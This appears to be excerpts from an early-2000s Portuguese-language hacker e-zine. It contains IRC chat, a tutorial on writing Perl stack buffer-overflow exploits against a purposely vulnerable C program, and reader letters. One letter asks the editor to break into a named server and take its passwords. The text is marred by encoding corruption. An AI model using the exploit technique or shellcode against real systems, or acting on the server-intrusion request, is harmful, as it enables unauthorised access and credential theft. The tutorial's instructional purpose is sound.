...
&lt;struck> Quero me candidatar a ficar com o Luiz Inßcio porque:  
&lt;psaux> sua mae tah bem struck ?
&lt;struck> ta obrigado
&lt;struck> responde a pergunta q eu coloca lah
&lt;struck> O Luiz Inßcio deveria me escolher porque: 
&lt;struck> Para conquistar o Luiz Inßcio seria capaz de: 
&lt;psaux> porque ele usa a foto do psaux, q eh um gatao
&lt;psaux> =D
&lt;psaux> poe isso
&lt;psaux> usar a foto do psaux
&lt;psaux> &lt;struck> Para conquistar o Luiz Inßcio seria capaz de:
&lt;psaux> usar a foto do psaux
...
A vermelha queima muito lentamente, nπo eh esplosiva, portanto
...
~~~~~~~~~~~~~~~~~~~~
 ...
 [ 1.   Introduτπo 
 [ 2.   Exemplo de Programa vulnerßvel 
 [ 3.   Shellcode
...
Este txt Θ para esses que querem uma aproximaτπo prßtica a escrever exploits 
explorando condicoes a buffer overflow.
Como diz o tφtulo, este texto lhe ensinarß como escrever exploits em Perl.

Se vocΩ quer um guia mais detalhado, por favor dΩ uma olhada nos links no final
deste texto.

2] Exemplo de Programa vulnerßvel:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ok, vamos a um exemplo. Eu escrevi um programa pequeno que Θ explorßvel a 
buffer overflow. strcpy() nπo confere o comprimento de $KIDVULN
...
int main() {
  ...
  if (getenv("KIDVULN") == NULL) {
    fprintf(stderr, " Cresτa! !\n");
    exit(1);
  }

  /* LΩ os dados das varißveis de ambiente no buffer */
  strcpy(kidbuffer, (char *)getenv("KIDVULN"));

  printf("Varißvel de Ambiente KIDVULN Θ:\n\"%s\".\n\n", kidbuffer);
  printf("A vida nπo Θ maravilhosa no jardim de infΓncia?\n");
  return 0;
}
...
A vida nπo Θ maravilhosa no jardim de infΓncia?
...
0k, aqui n≤s podemos ver que o tamanho do buffer nπo era bastante grande. Se 
tivesse sido, entπo o "stack pointer" teria sido escrito e o EIP teria sido 
...
Agora, n≤s escrevemos totalmente o velho "return adress". N≤s temos agora os
quatro A┤s (41). Bem, n≤s agora sabemos para onde EIP aponta, e entπo n≤s 
podemos conseguir que EIP apontem a nossa carga util. Se tiver Ωxito que 
nosso c≤digo serß executado no "stack". 
...
N≤s sabemos agora o comprimento para ser usado para escrever elaboradamente
o "return address."
Desde que pontos de ESP para o topo do "stack", n≤s podemos usar o valor de
ESP quando o programa morreu, e (se precisou) some um compense a isto.  
  
Isto Θ como vocΩ adquire o valor do "stack pointer" para usar o exploit.
...
Bem, nπo eh o objetivo dessa traduτπo e adptaτπo ensinar a escrever shellcode...
...
A carga util serß armazenada no do "$buffer ", com os dados que serπo,  
usado para a "exploitaτπo ". Terß o comprimento necessario para sobrescrever completamente  
o velho return address. N≤s inseriremos este c≤digo no programa mirado  
...
Hß raz⌡es por que n≤s construφmos o "Buffer" deste modo. Primeiro n≤s temos muito  
NOPs, entπo o  shellcode (o qual neste exemplo executarß /bin/sh), e afinal  
o  ESP + offset.  
  
O  registro de EIP serß carregado com o valor apontado por ESP. Assim se ESP  
aponta para qualquer lugar dentro do NOPs, o NOPs nπo farß nenhuma operaτπo, e  
continua nπo fazendo nada atΘ alcancar o shellcode e entπo  
...
Se o buffer que n≤s estßvamos tentando o overflow  tivesse sido muito pequeno 
somar uma decente quantia de NOP, o shellcode e  RET┤s, abaixo do plano poderia
ter sido usado ao construir a carga util. (N≤s poderφamos ter somado o NOP e 
shellcode em uma "shell-varißvel " como bem)  
...
(Nota: O buffer nπo pode conter nenhum byte NULO!)
...
# Entπo n≤s acrescentamos o shellcode ao buffer. N≤s abrimos espaτo para o shellcode  

print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n");

# Aqui n≤s acrescentamos o offset ao valor do stack pointer - convertendo em hex,  
# e entπo imprime isto.

$new_ret = pack('l', ($ret + $offset));

# pack Θ uma funτπo que levarß uma lista de valores e empacotarß isto em um  
# estrutura binßria, e entπo devolve para a string o que contΘm a estrutura.  
# Assim, empacote o stack pointer / ESP + offset em uma signed long - (4 bytes).


# Aqui n≤s acrescentamos o comprimento do shellcode ao scalar $i que depois da  
# primeira volta tinha terminado com o valor " 885 " (bytes), entπo ele volta  
# a somar o scalar de $new_ret atΘ que $buffer tenha o tamanho de 1032 bytes.  
#  
...
# TambΘm poderia ter sido escrito assim:
#
...
# Copia para a shell a varißvel KIDVULN, e execute vuln.
...
bash-2.03# ./Xploit.pl 
Address: 0xbfffeee8
Varißvel de Ambiente KIDVULN Θ:
FëF   V
   ░  N═Ç1█ë╪@═ÇΦ▄   /bin/shΦε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐
Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐Φε ┐".
...
&lt;struck> olha soh
&lt;struck> Bem essa Θ primeira vez que escrevo pra essa zine (ou pra qualquer zine) e 
&lt;struck> apesar de nπo ir muito com a cara do struck, resolvi escrever pra essa zine,
...
&lt;struck>  Sabe aqueles programinha q servem para derrubar o kra do chat! Você tambem
...
&lt;struck> zaç╞o de coleta de senhas dos maiores provedores do Mundo.
...
&lt;Carti> q cruel
&lt;struck> olha soh
&lt;struck> Inicio digitamento: 01/04/2001 às 02:54 am
&lt;struck>  Termini digitamento: 01/04/2001 às 06:32 am
...
teste legal em www.gabrieltorres.com ... a o X na questπo siguinifica q num 
sei , como vc disse , sem chutes isso soh no vestiba e na iscola q era o q 
mais sabia faze nos provπo q tinha hauhauaha ... 

(Respostas)

    ah se na de linguagem de alto e baxo nivel vc disser q Θ a letra C o 
bixo pega hehehe zuando , aquela fui por eliminaτπo pq vc disse de alto e 
...
contrario .... a B) era a q coloquei e a C ... quem sabe ... ahuahauahuaha 
    ...
    ah otra coisa teu zine Θ bom pacas ... tipow as materia saum vbem 
escrita e facil pra entender , tu podi num credita mais tava comeτando a 
saca como escrve xploit e talz mto tesπo quando vc faiz seus prog funfa , 
fiz varias coisa , teu zine deu uma forτa comecei e intende as parada ai 
...
forτa pra vc manu .. fuiz ... !!!! 

  Obs.: como to com o win se num sabe de nenhuma page de porgramaτπo com 
texto sobre funτ⌡es pra mexe no registro do windowz neh ... se soube de 
...
Mais uma nova zine estah nascendo (unhΘΘΘ!)
...
kero lhe dizer q 70% das coisas q sei hoje foi graτas as vc (suas zines) e
aos seus amigos hackers q lhe ajudavam a editar suas zines. Tenho todas as
suas zines desde a CsZine d  00 a 25 e a f3rror da 00 atΘ a 04 (nπo vamos 
entrar em detalhes). Mas este e-mail e para lhe fazer um pedido. Eu estou 
lanτando minha zine a "Bhoor Zine", eu keria lhe pedir q vc divulgasse aos 
seus amigos a minha zine q pode ser encontrada no site http://www.txt.org 
(l  e s≤ procurar por "Bhoor" (sem as aspas). Se nπo for pedir d+ de uma 
lida e mande um e-mail para mim (*********@globo.com) falando sobre ela o q
vc achou! 
 Hß para nπo eskecer vou tambem lhe mandar o c≤digo fonte do ALTIVORE.C,
q e um programa de seguranτa q achu q vc vai gostar! Blz. Se kiser pode botar
este mail na sua proxima zine (f3_05). A 04 tß filΘ espero q nπo sejß incomodo!
Valeu...
...
QualΘ manow, sempre segui e li muito suas zines! Sπo muito boas, mas mandei
este mail p/ se podesse me dizer, qual o curso da purcs vc estß cursando!
Estou p/ fazer vestibular neste fim de ano e queria uma dica sua, de preferΩncia
um curso que ensine algo referente a hacking, sei lß, Analista de Sistemas,
Programador SR, ou algo que venha a ser do ramo hacking! Valew manow...
 Hßa, sobre a zine f3, tß legal pra leleu. E queria fazer uma pergunta:
No meu estado tem um server que estou precisando pegar umas senhas [passwd's],
se nπo fosse muito incomodo []'s sei lß velhow jß tentei de tudo [exploits,
backdoors e outros recursos] mas nπo deu em nada por issu pegue pelo menos
20 min de seu acesso a net e de uma olhada no server: www.infonet.com.br
 Valeu, caso consiga exito mande um mail com o file anexado! Nπo pense ke
pq nπo consegui os passwd's vc estß pensando que sou mais um daqueles lamers
...
Olß, vocΩ estß na lista de atualizaτπo do www.onlooker.hpg.com.br
...
muitos links legais, e de utilidade dos hax0rs, e para pessoas normais tambΘm!
